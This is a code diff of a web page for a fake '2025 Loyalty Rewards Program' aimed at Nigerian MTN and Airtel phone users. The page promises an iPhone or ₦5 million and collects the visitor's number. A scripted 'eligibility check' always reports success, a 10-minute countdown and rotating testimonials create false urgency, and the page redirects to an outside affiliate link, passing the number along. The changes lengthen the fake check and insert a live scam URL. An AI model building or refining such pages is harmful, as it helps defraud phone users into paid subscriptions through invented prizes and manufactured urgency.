@@ -12,7 +12,6 @@
     margin: 0;
     padding: 0;
   }
-
   /* ===== Testimonial Pop-Down ===== */
   .testimonial-pop {
     position: fixed;
@@ -45,7 +44,6 @@
     opacity: 0.85;
     margin-top: 4px;
   }
-
   /* ===== Container ===== */
   .container {
     max-width: 550px;
@@ -66,7 +64,6 @@
     line-height: 1.5;
     color: #ccc;
   }
-
   /* ===== Images ===== */
   .image-grid {
     display: grid;
@@ -81,14 +78,12 @@
     border-radius: 10px;
     border: 2px solid #2a2a2a;
   }
-
   .below-image-text {
     text-align: center;
     margin-bottom: 18px;
     font-size: 15px;
     color: #ccc;
   }
-
   /* ===== Form ===== */
   .form-group { margin-top: 10px; }
   input[type="tel"] {
@@ -114,7 +109,6 @@
     transition: transform 0.2s ease;
   }
   button:hover { transform: scale(1.03); }
-
   /* ===== Loading ===== */
   .loading-screen {
     display: none;
@@ -137,7 +131,6 @@
   }
   @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
   .loading-text { font-size: 16px; color: #ccc; text-align: center; line-height: 1.5; }
-
   /* ===== Popup ===== */
   .popup {
     display: none;
@@ -161,17 +154,18 @@
   }
   .popup-box h2 { color: #ff4444; }
   .popup-box p { font-size: 15px; line-height: 1.5; }
-  .popup-box button {
-    background: #25d366;
-    font-weight: bold;
-  }
   .popup-box small {
     display: block;
     margin-top: 10px;
     font-size: 12px;
     color: #aaa;
   }
-
+  .reward-text {
+    margin: 15px 0 5px;
+    color: #ffcc00;
+    font-size: 16px;
+    font-weight: bold;
+  }
   /* Footer */
   .footer {
     font-size: 12px;
@@ -198,21 +192,17 @@
     <h1>2025 Loyalty Rewards Program</h1>
     <p>As part of our 2025 Customer Rewards Program, selected users may be eligible to receive a free iPhone 14 Pro Max, ₦5,000,000 cash prize or unlimited data bundle.</p>
   </div>
-
   <div class="image-grid">
     <img src="https://i.postimg.cc/vmpk9fRZ/images-2-8.jpg" alt="iPhone Giveaway" />
     <img src="https://i.postimg.cc/XqWP1WYM/images-2-10.jpg" alt="₦5 Million Cash Prize" />
     <img src="https://i.postimg.cc/j5nKYRTL/images-2-11.jpg" alt="Car Giveaway" />
     <img src="https://i.postimg.cc/h4p4WVC6/Screenshot-20250731-071855.jpg" alt="Unlimited Data" />
   </div>
-
   <div class="below-image-text">Enter your mobile number below to check if you're qualified</div>
-
   <div class="form-group">
     <input type="tel" id="msisdn" placeholder="Enter your MTN or Airtel number" />
     <button onclick="startCheck()">Check Eligibility</button>
   </div>
-
   <div class="footer">Only MTN and Airtel users are eligible. Terms & Conditions apply.</div>
 </div>
 
@@ -227,19 +217,22 @@
     <p>You didn't qualify for an iPhone giveaway.<br><br>
        But you qualify for a <strong>₦5 million naira giveaway</strong>!<br>
        And expires in <strong>10 minutes</strong>.</p>
+    <div class="reward-text">Subscribe now to claim your reward</div>
     <button onclick="redirectToOffer()">Subscribe to Claim Now</button>
     <small>Your mobile number is required</small>
   </div>
 </div>
 
 <script>
+let testimonialInterval;
 function startCheck() {
   const number = document.getElementById('msisdn').value.trim();
-  if (!/^0[789][01]\d{8}$/.test(number)) { // FIXED regex
+  if (!/^0[789][01]\d{8}$/.test(number)) {
     alert('Please enter a valid 11-digit Nigerian number');
     return;
   }
   document.getElementById('loading').style.display = 'flex';
+  clearInterval(testimonialInterval); // stop pop-downs immediately
 
   const messages = [
     "Checking eligibility...",
@@ -248,7 +241,6 @@ function startCheck() {
     "Almost done...",
     "You qualified!"
   ];
-
   let index = 0;
   const interval = setInterval(() => {
     if (messages[index]) {
@@ -256,17 +248,17 @@ function startCheck() {
     }
     index++;
     if (index >= messages.length) clearInterval(interval);
-  }, 1800);
+  }, 3000); // spread over 15 seconds
 
   setTimeout(() => {
     document.getElementById('loading').style.display = 'none';
     document.getElementById('result').style.display = 'flex';
-  }, 9000);
+  }, 15000); // now 15s
 }
 
 function redirectToOffer() {
   const number = document.getElementById('msisdn').value.trim();
-  window.location.href = `https://your-smartlink.com/?msisdn=${number}`;
+  window.location.href = `https://mljxqvr.bid/cl/eb903cbd52b9ff97?msisdn=${number}`;
 }
 
 // ===== Testimonial Rotation =====
@@ -285,14 +277,12 @@ function showTestimonial() {
   testimonialMessage.textContent = t.msg;
   testimonialTime.textContent = t.time;
   testimonialPop.classList.add('show');
-
   setTimeout(() => {
     testimonialPop.classList.remove('show');
   }, 4000);
-
   tIndex = (tIndex + 1) % testimonials.length;
 }
-setInterval(showTestimonial, 7000);
+testimonialInterval = setInterval(showTestimonial, 7000);
 setTimeout(showTestimonial, 2000);
 </script>
 
